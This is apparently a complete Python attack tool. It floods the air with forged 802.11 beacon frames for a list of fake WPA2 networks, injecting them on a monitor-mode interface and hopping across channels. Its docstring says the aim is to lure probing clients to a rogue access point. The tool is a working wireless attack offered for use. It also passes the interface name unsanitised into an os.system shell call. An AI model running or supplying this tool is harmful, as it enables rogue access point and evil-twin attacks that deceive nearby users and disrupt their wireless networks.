#!/usr/bin/env python3
"""Beacon flooder: crafts raw 802.11 beacon frames and pumps them onto a
monitor-mode NIC, one frame per SSID, cycling forever. Can hop channels (e.g.
1,6,11) so the fake networks show up across the spectrum. Attract-and-hold:
clients that probe for one of these names will find *us* on the rogue row.

Usage (root):
    beaconflood.py --iface wlan0 --ssids A,B,C [--channels 1,6,11] [--hidden]
"""
import argparse
import hashlib
import os
import socket
import struct
import sys
import time

IE_SSID = 0
IE_RATES = 1
IE_DS = 3
IE_RSN = 48
IE_EXT_SUPP_RATES = 50

RATE_BASIC = bytes([0x82, 0x84, 0x8b, 0x96])          # 1-11 Mb/s (basic)
RATE_EXT = bytes([0x0c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c, 0x80, 0x24])

BROADCAST = b"\xff\xff\xff\xff\xff\xff"


def ie(tag, payload):
    return struct.pack("BB", tag, len(payload)) + payload


def fake_mac(ssid):
    d = hashlib.sha256(ssid.encode("utf-8", "replace")).digest()
    return b"\x02\x00\x00" + d[:3]


RADIOTAP_PREFIX = bytes.fromhex("00000e000e000000")  # v0, len 14, present: flags|rate|channel


def channel_freq(channel):
    return 2407 + channel * 5 if channel < 14 else 5000 + channel * 5


def radiotap(channel):
    """Radiotap header mac80211 requires for monitor injection (rate+channel)."""
    freq = channel_freq(channel)
    flags = 0x0060 if freq < 5000 else 0x0080
    return RADIOTAP_PREFIX + bytes([0x00, 0x02]) + struct.pack("<HH", freq, flags)


def beacon_frame(ssid, channel, hidden=False):
    """802.11 mgmt beacon for one SSID on one channel (WPA2-flagged)."""
    bssid = fake_mac(ssid)
    src = bssid
    hdr = struct.pack("<H6s6s6sH", 0x0080, src, BROADCAST, bssid, 0)
    interval = 100
    caps = 0x0101  # ESS + short preamble
    fixed = struct.pack("<QHH", 0, interval, caps)
    ssid_ie = b"" if hidden else ssid.encode("utf-8", "replace")[:32]
    rsn = (struct.pack("<H", 1) + bytes.fromhex("000fac04") +
           struct.pack("<H", 1) + bytes.fromhex("000fac04") +
           struct.pack("<H", 1) + bytes.fromhex("000fac02"))
    ies = b""
    ies += ie(IE_SSID, ssid_ie)
    ies += ie(IE_RATES, RATE_BASIC)
    ies += ie(IE_DS, bytes([channel & 0xff]))
    ies += ie(IE_RSN, rsn)
    ies += ie(127, struct.pack("<BB", 1, 12))
    ies += ie(IE_EXT_SUPP_RATES, RATE_EXT)
    return hdr + fixed + ies


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--iface", required=True)
    ap.add_argument("--ssids", required=True, help="comma-separated SSID list")
    ap.add_argument("--channels", default="1,6,11")
    ap.add_argument("--hidden", action="store_true")
    ap.add_argument("--pps", type=int, default=25, help="frames per second total")
    args = ap.parse_args()

    ssids = [s.strip() for s in args.ssids.split(",") if s.strip()][:24]
    channels = [int(c) for c in args.channels.split(",") if c.strip().isdigit()]
    if not ssids or not channels:
        print("error: need --ssids and at least one --channel", flush=True)
        return 1

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    try:
        sock.bind((args.iface, 0))
    except OSError as exc:
        print("error: cannot bind %s: %s" % (args.iface, exc), flush=True)
        return 1

    interval = 1.0 / max(1, args.pps)
    cur_ch = None
    sent = 0
    print("beacon flood up on %s (%d ssids, channels %s)" %
          (args.iface, len(ssids), ",".join(str(c) for c in channels)), flush=True)
    i = 0
    try:
        while True:
            ssid = ssids[i % len(ssids)]
            ch = channels[(i // len(ssids)) % len(channels)]
            if ch != cur_ch:
                os.system("iw dev %s set channel %d >/dev/null 2>&1" % (args.iface, ch))
                cur_ch = ch
            frame = radiotap(ch) + beacon_frame(ssid, ch, hidden=args.hidden)
            try:
                sock.send(frame)
                sent += 1
            except OSError:
                pass
            if sent % 200 == 0:
                print("sent %d" % sent, flush=True)
            time.sleep(interval)
            i += 1
    except KeyboardInterrupt:
        pass
    print("sent %d total" % sent, flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())